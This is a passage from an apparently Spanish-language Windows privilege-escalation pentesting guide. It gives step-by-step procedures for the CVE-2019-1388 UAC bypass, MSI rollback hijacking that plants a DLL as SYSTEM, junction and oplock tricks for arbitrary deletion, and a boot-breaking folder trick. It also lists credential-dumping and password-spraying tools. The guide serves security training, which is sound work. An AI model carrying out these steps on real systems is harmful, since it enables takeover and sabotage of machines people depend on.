Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Para explotar esta vulnerabilidad, es necesario realizar los siguientes pasos:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Tienes todos los archivos e información necesarios en el siguiente repositorio de GitHub:

https://github.com/jas502n/CVE-2019-1388

## De Administrator Medium a High Integrity Level / UAC Bypass

Lee esto para aprender sobre Integrity Levels:


{{#ref}}
integrity-levels.md
{{#endref}}

Luego lee esto para aprender sobre UAC y UAC bypasses:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## De Arbitrary Folder Delete/Move/Rename a SYSTEM EoP

La técnica descrita [**en este blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) con un código de exploit [**disponible aquí**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

El ataque básicamente consiste en abusar de la funcionalidad de rollback de Windows Installer para reemplazar archivos legítimos con archivos maliciosos durante el proceso de desinstalación. Para esto el atacante necesita crear un **malicious MSI installer** que será usado para secuestrar la carpeta `C:\Config.Msi`, la cual luego será usada por Windows Installer para almacenar archivos de rollback durante la desinstalación de otros paquetes MSI donde los archivos de rollback habrán sido modificados para contener la carga útil maliciosa.

La técnica resumida es la siguiente:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> En este punto, **trigger the SYSTEM-level arbitrary folder delete vulnerability** para borrar `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Este flujo almacena los **metadatos del índice** de la carpeta.

Por lo tanto, si **eliminas el flujo `::$INDEX_ALLOCATION`** de una carpeta, NTFS **elimina toda la carpeta** del sistema de archivos.

Puedes hacerlo usando APIs estándar de eliminación de archivos como:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Aunque estés llamando a una API de eliminación de *archivo*, en realidad **elimina la carpeta en sí**.

### De la eliminación del contenido de la carpeta a SYSTEM EoP
¿Qué pasa si tu primitiva no te permite eliminar archivos/carpetas arbitrarios, pero **sí permite la eliminación del *contenido* de una carpeta controlada por el atacante**?

1. Paso 1: Prepara una carpeta y archivo señuelo
- Crear: `C:\temp\folder1`
- Dentro de ella: `C:\temp\folder1\file1.txt`

2. Paso 2: Coloca un **oplock** en `file1.txt`
- El oplock **pausa la ejecución** cuando un proceso privilegiado intenta eliminar `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Paso 3: Activar el proceso SYSTEM (p. ej., `SilentCleanup`)
- Este proceso escanea carpetas (p. ej., `%TEMP%`) e intenta eliminar su contenido.
- Cuando alcanza `file1.txt`, se activa el **oplock triggers** y entrega el control a tu callback.

4. Paso 4: Dentro del oplock callback – redirigir la eliminación

- Opción A: Mover `file1.txt` a otra ubicación
- Esto vacía `folder1` sin romper el oplock.
- No elimines `file1.txt` directamente — eso liberaría el oplock prematuramente.

- Opción B: Convertir `folder1` en una **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opción C: Crear un **symlink** en `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Esto apunta al flujo interno de NTFS que almacena los metadatos de la carpeta — eliminarlo elimina la carpeta.

5. Paso 5: Liberar el oplock
- El proceso SYSTEM continúa e intenta eliminar `file1.txt`.
- Pero ahora, debido al junction + symlink, en realidad está eliminando:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Resultado**: `C:\Config.Msi` es eliminado por SYSTEM.

### De crear una carpeta arbitraria a DoS permanente

Aprovecha una primitiva que te permite **crear una carpeta arbitraria como SYSTEM/admin** — incluso si **no puedes escribir archivos** o **establecer permisos débiles**.

Crea una **carpeta** (no un archivo) con el nombre de un **controlador crítico de Windows**, p. ej.:
```
C:\Windows\System32\cng.sys
```
- Esta ruta normalmente corresponde al controlador en modo kernel `cng.sys`.
- Si lo **pre-creas como una carpeta**, Windows falla al cargar el controlador real durante el arranque.
- Entonces, Windows intenta cargar `cng.sys` durante el arranque.
- Ve la carpeta, **no logra resolver el controlador real**, y **se bloquea o detiene el arranque**.
- No hay **mecanismo de respaldo**, y **no hay recuperación** sin intervención externa (p. ej., reparación de arranque o acceso al disco).


## **De High Integrity a SYSTEM**

### **Nuevo servicio**

Si ya estás en un proceso de High Integrity, la **ruta a SYSTEM** puede ser sencilla simplemente **creando y ejecutando un nuevo servicio**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Al crear un binario de servicio asegúrate de que sea un servicio válido o que el binario realice las acciones necesarias rápidamente, ya que será terminado en 20s si no es un servicio válido.

### AlwaysInstallElevated

Desde un proceso de alta integridad podrías intentar **habilitar las entradas de registro AlwaysInstallElevated** e **instalar** una reverse shell usando un wrapper _**.msi**_.\
[Más información sobre las claves de registro implicadas y cómo instalar un paquete _.msi_ aquí.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Puedes** [**encontrar el código aquí**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Si tienes esos privilegios de token (probablemente los encontrarás en un proceso ya de alta integridad), podrás **abrir casi cualquier proceso** (no procesos protegidos) con el privilegio SeDebug, **copiar el token** del proceso y crear un **proceso arbitrario con ese token**.\
Usando esta técnica suele seleccionarse **cualquier proceso ejecutándose como SYSTEM con todos los privilegios de token** (_sí, puedes encontrar procesos SYSTEM sin todos los privilegios de token_).\
**Puedes encontrar un** [**ejemplo de código que ejecuta la técnica propuesta aquí**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Esta técnica la usa meterpreter para escalar en `getsystem`. La técnica consiste en **crear una pipe y luego crear/abusar de un servicio para escribir en esa pipe**. Entonces, el **servidor** que creó la pipe usando el privilegio **`SeImpersonate`** podrá **suplantar el token** del cliente de la pipe (el servicio) obteniendo privilegios SYSTEM.\
Si quieres [**aprender más sobre named pipes deberías leer esto**](#named-pipe-client-impersonation).\
Si quieres leer un ejemplo de [**cómo pasar de high integrity a System usando named pipes deberías leer esto**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Si logras **secuestrar una dll** que está siendo **cargada** por un **proceso** ejecutándose como **SYSTEM** podrás ejecutar código arbitrario con esos permisos. Por lo tanto Dll Hijacking también es útil para este tipo de escalada de privilegios y, además, es mucho **más fácil de lograr desde un proceso de alta integridad** ya que tendrá **permisos de escritura** en las carpetas usadas para cargar dlls.\
**Puedes** [**aprender más sobre Dll hijacking aquí**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lee:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Mejor herramienta para buscar vectores de escalada de privilegios locales en Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Comprueba malas configuraciones y archivos sensibles (**[**checa aquí**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detectado.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Comprueba posibles malas configuraciones y recopila información (**[**checa aquí**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Comprueba malas configuraciones**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrae información de sesiones guardadas de PuTTY, WinSCP, SuperPuTTY, FileZilla y RDP. Usa -Thorough en local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrae credenciales del Credential Manager. Detectado.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Distribuye (spray) contraseñas recopiladas por todo el dominio**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh es una herramienta PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer y man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumeración básica para privesc en Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Busca vulnerabilidades conocidas de privesc (DEPRECATED para Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Comprobaciones locales **(Necesita derechos de Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Busca vulnerabilidades conocidas de privesc (necesita compilarse con VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera el host buscando malas configuraciones (más una herramienta de recolección de información que de privesc) (necesita compilarse) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrae credenciales de muchos programas (exe precompilado en github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Adaptación de PowerUp a C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Comprueba malas configuraciones (ejecutable precompilado en github). No recomendado. No funciona bien en Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Comprueba posibles malas configuraciones (exe desde python). No recomendado. No funciona bien en Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Herramienta creada basada en este post (no necesita accesschk para funcionar correctamente pero puede usarlo).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lee la salida de **systeminfo** y recomienda exploits que funcionan (python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lee la salida de **systeminfo** y recomienda exploits que funcionan (python local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Tienes que compilar el proyecto usando la versión correcta de .NET ([ve esto](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Para ver la versión instalada de .NET en el host víctima puedes hacer:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referencias

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
